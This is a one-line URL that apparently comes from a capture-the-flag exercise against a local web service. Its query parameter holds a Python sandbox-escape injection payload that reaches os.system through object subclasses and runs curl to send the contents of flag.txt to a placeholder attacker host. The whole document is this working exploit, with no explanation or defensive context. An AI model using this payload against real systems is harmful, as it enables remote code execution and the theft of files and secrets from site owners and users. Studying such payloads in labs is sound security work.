```
http://127.0.0.1/old?inject=[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('curl ATTACKER_SERVER/$(cat flag.txt)')
```
